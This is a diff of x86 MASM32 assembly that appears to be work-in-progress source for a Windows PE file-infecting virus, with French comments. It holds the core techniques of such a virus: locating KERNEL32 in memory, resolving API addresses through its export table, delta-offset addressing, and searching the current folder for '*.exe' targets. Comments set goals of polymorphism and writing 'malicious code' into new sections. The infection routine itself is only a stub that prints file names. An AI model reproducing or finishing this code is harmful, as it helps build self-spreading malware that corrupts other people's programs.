@@ -2,28 +2,38 @@
 ; DELTA OFFSET // CALL 0 => data a la fin
 ; new section -> addr la plus grande d une section + sa taille
 ; si pas la place -> quit
-; bonuis: UPX unpacker
+; bonus: UPX unpacker
 ; bonus: infecte peut infecter
 ; bonus: ne pas modifier entry point
 ; bonus: polymorphique obligatoire
- 
+
 .386
 .model flat, stdcall
 option casemap :none
-    
+
     include \masm32\include\windows.inc
     include \masm32\include\user32.inc
     include \masm32\include\kernel32.inc
 
+    include \masm32\include\masm32.inc
+    include \masm32\include\msvcrt.inc
+
     includelib \masm32\lib\user32.lib
     includelib \masm32\lib\kernel32.lib
+
+    includelib \masm32\lib\masm32.lib
+    includelib \masm32\lib\msvcrt.lib
 
 .data
 ; No data here please, put it at the end of the .code section
 
+   ; I can read... but it's temporary
+   win32_find_data                     WIN32_FIND_DATAA <?>
+   FileHandleFind                      dd ?
+
 .code
 
-start:  
+start:
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Find the KERNEL32 base address, works at the entry point of the program
@@ -35,18 +45,17 @@ find_PE:
     sub     esi,1000h           ; find the DOS Header (aligned on 0x1000)
     cmp     word ptr [esi],"ZM"
     jne     find_PE
-    
+
     mov     ecx,[esi+3Ch]       ; offset to EXE header
     lea     edi,[esi+ecx]       ; address of the EXE header
     cmp     word ptr [edi],"EP" ; double check with the "PE" magic
     jne     exit_fail
 
-
 ; DELTA OFFSET to retrieve any variable address
     call deltaoffset
 deltaoffset:
     pop ebp ; put EIP in ebp
-    
+
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; TUTORIAL: how to use function and data
 ; Call a kernel32 routine:
@@ -68,8 +77,8 @@ deltaoffset:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
     ; TODO: foreach file in current dir
-    
-    ; TODO: routine to open a file and 
+
+    ; TODO: routine to open a file and
     ; si ya la place pour une nouvelle section, la creer
     ; et modifier le point d'entree pour pointer dessus
     ; retourne le point d'entree precedent
@@ -79,8 +88,35 @@ deltaoffset:
 
     ; TODO: si retourne NULL, pour le moment, on annule
     ; et passe a la suite
-    ; sinon, writefile le code malveillant 
+    ; sinon, writefile le code malveillant
 
+find_first:
+    ; find first .exe file - filter: *.exe. exit_fail if none is found
+    mov     eax, ebp ; EBP -> real address of delta offset
+    add     eax, offset FindFirstFile_b
+    sub     eax, offset deltaoffset
+    ; call ent_get_function_addr with "FindFirstFile"
+    push    eax
+    push    edi ; PE header
+    push    esi ; DOS header
+    call    ent_get_function_addr
+    ; push args && call the function: arg1 WIN32_FIND_DATA, arg2 filter '*.exe'
+    mov     ecx, ebp
+    add     ecx, offset win32_find_data
+    sub     ecx, offset deltaoffset
+    mov     ebx, ebp
+    add     ebx, offset filter
+    sub     ebx, offset deltaoffset
+    push    ecx
+    push    ebx
+    call    eax
+    ; If it hasn't found any file, jumps to exit_fail
+    cmp     eax, -1
+    jz      exit_fail
+    ; Else save the Handle in FileHandleFind
+    mov     FileHandleFind, eax
+    ; call infect_file to try and infect it
+    call infect_file
 
     call    exit_success
 
@@ -89,9 +125,9 @@ deltaoffset:
 
 
 ; Work in progress
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;    
-; Iterate on all section headers (ebx) 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Iterate on all section headers (ebx)
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     ;lea     ebx,[edi+SIZEOF IMAGE_NT_HEADERS]   ; address of the first IMAGE_SECTION_HEADER
     ;mov     dx,[edi+6h]                         ; number of sections
 
@@ -114,14 +150,14 @@ deltaoffset:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Explore the ENT (Export Name Table) of KERNEL32
 ; And return the matching function address
-; 3 params: 
+; 3 params:
 ;   pointer to the DOS header -> ebp + 8
 ;   pointer to the PE header -> ebp + 12
 ;   pointer to the function name -> ebp + 16
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ent_get_function_addr:
 
-    ; Set up a stack frame 
+    ; Set up a stack frame
     push    ebp
     mov     ebp,esp
     ; Saves context
@@ -169,7 +205,7 @@ ent_get_function_addr:
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Returns the index the function name
-; 4 params: 
+; 4 params:
 ;   pointer to the ENT name array (absolute) -> ebp + 8
 ;   pointer to the DOS header (absolute) -> ebp + 12
 ;   Number of names -> ebp + 16
@@ -177,7 +213,7 @@ ent_get_function_addr:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ent_find_name:
 
-    ; Set up a stack frame 
+    ; Set up a stack frame
     push    ebp
     mov     ebp,esp
 
@@ -189,6 +225,7 @@ ent_find_name:
     mov     esi,[ebp+20]    ; Name to look for
     mov     edx,[ebp+16]    ; Number of names
     mov     ecx,0           ; Initialize the counter
+
 ent_next_name:
 
     mov     ebx,[ebp+8]
@@ -212,7 +249,7 @@ ent_next_name:
     cmp     eax,0           ; Did we find the string?
     je      ent_name_success
 
-    dec     edx        
+    dec     edx
     jz      ent_name_done   ; No more names
 
     inc     ecx
@@ -238,14 +275,14 @@ ent_next_name:
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; sub-routine: returns the name ordinal
-; 3 params: 
+; 3 params:
 ;   pointer to the ENT ordinal array (absolute) -> ebp + 8
 ;   base ordinal DWORD -> ebp + 12
 ;   index of the function name -> ebp + 16
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ent_ordinal:
 
-    ; Set up a stack frame 
+    ; Set up a stack frame
     push    ebp
     mov     ebp,esp
 
@@ -275,14 +312,14 @@ ent_ordinal:
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; sub-routine: returns the function's address
-; 2 params: 
+; 2 params:
 ;   pointer to the ENT function array (absolute) -> ebp + 8
 ;   function ordinal (DWORD) -> ebp + 12
 ;   pointer to DOS header -> ebp + 16
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ent_function:
 
-    ; Set up a stack frame 
+    ; Set up a stack frame
     push    ebp
     mov     ebp,esp
 
@@ -307,7 +344,7 @@ ent_function:
     ret     12
 
 strlen_:
-    ; Set up a stack frame 
+    ; Set up a stack frame
     push    ebp
     mov     ebp,esp
 
@@ -336,7 +373,7 @@ strlen_done:
     ret     4
 
 strcmp_:
-    ; Set up a stack frame 
+    ; Set up a stack frame
     push    ebp
     mov     ebp,esp
 
@@ -375,7 +412,10 @@ strcmp_done:
     pop     ebp
     ret     8
 
-
+infect_file:
+    ; nada
+    invoke  StdOut, offset win32_find_data.cFileName
+    ret     0
 
 exit_success:
     ; WIN
@@ -388,7 +428,29 @@ exit_fail:
     call    eax
 
 ; All the virus data: use delta offset
-;virus_data:
+virus_data:
+;   filetime struct
+;       dwLowDateTime     DWORD     ?
+;       dwHighDateTime    DWORD     ?
+;   filetime ends
+
+;   find_data struct
+;       dwFileAttributes       DWORD ?
+;       ftCreationTime         filetime <?>
+;       ftLastAccessTime       filetime <?>
+;       ftLastWriteTime        filetime <?>
+;       nFileSizeHigh          DWORD ?
+;       nFileSizeLow           DWORD ?
+;       dwReserved0            DWORD ?
+;       dwReserved1            DWORD ?
+;       cFileName              BYTE 260 dup (?)
+;       cAlternateFileName     BYTE 14  dup (?)
+;   find_data ends
+
+   ;win32_find_data                     find_data <?>
+   ;win32_find_data                     WIN32_FIND_DATAA <?>
+   ;FileHandleFind                      dd ?
+   filter          db "*.exe",0
 
     ;WndTextOut1 db  "Address: 0x"
     ;WndTextOut2 db  8 dup (66), 13, 10
@@ -397,9 +459,10 @@ exit_fail:
     ;NewLine     db  "  ",0
     ;exportName  db  "ExitProcess",0
 
-    ExitProcess_b   db  "ExitProcess",0
-    ExitProcess_f   dd  0
-    Beep_b          db  "Beep",0
-    Beep_f          dd  0
+   FindFirstFile_b db  "FindFirstFileA",0
+   ExitProcess_b   db  "ExitProcess",0
+   ExitProcess_f   dd  0
+   Beep_b          db  "Beep",0
+   Beep_f          dd  0
 
 end start
